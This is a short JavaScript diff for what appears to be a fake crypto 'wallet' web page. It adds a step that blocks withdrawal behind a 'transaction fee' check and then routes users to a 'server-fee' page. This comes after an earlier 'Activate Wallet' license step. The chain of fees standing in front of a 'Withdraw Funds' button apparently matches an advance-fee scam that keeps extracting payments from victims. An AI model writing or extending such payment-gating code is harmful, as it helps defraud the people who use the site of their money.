@@ -94,11 +94,10 @@
       .then(data => {
         const licenseBtn = document.getElementById("licenseBtn");
         if (data.license === "active") {
-          licenseBtn.textContent = "Withdraw Funds";
-          licenseBtn.onclick = () => {
-            window.location.href = "transaction.html";
-          };
+          // License is active, check if transaction fee is paid
+          checkTransactionFeeStatus();
         } else {
+          // License is not active, redirect to license page
           licenseBtn.textContent = "Activate Wallet";
           licenseBtn.onclick = () => {
             window.location.href = "license.html";
@@ -107,6 +106,34 @@
       })
       .catch(() => {
         alert("Server error occurred.");
+      });
+    }
+
+    // Check if transaction fee is paid
+    function checkTransactionFeeStatus() {
+      fetch(`${API_BASE_URL}/final-tx`, {
+        headers: { "Authorization": "Bearer " + token }
+      })
+      .then(res => res.json())
+      .then(data => {
+        const licenseBtn = document.getElementById("licenseBtn");
+
+        if (data.status === "approved") {
+          // Transaction fee is paid, go to server fee page
+          licenseBtn.textContent = "Proceed to Server";
+          licenseBtn.onclick = () => {
+            window.location.href = "server-fee.html";
+          };
+        } else {
+          // Transaction fee is not paid, redirect to transaction page
+          licenseBtn.textContent = "Withdraw Funds";
+          licenseBtn.onclick = () => {
+            window.location.href = "transaction.html";
+          };
+        }
+      })
+      .catch(() => {
+        alert("Error checking transaction fee status.");
       });
     }
 
